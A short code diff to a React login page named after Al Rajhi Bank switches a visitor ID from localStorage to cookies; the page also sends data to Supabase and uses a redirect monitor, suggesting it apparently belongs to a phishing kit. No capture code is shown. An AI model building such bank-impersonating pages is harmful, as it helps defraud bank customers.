@@ -14,6 +14,8 @@ import {
 } from "lucide-react";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { addData } from "@/lib/supabase-client";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 type Screen = "login" | "loading";
 
@@ -24,7 +26,7 @@ export default function AlRajhiLoginPage() {
   const [rememberMe, setRememberMe] = useState(false);
   const [screen, setScreen] = useState<Screen>("login");
   const visitorId =
-    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";
+    typeof window !== "undefined" ? getCookie("visitor") || "" : "";
   useRedirectMonitor({
     visitorId: visitorId,
     currentPage: "rajhi",
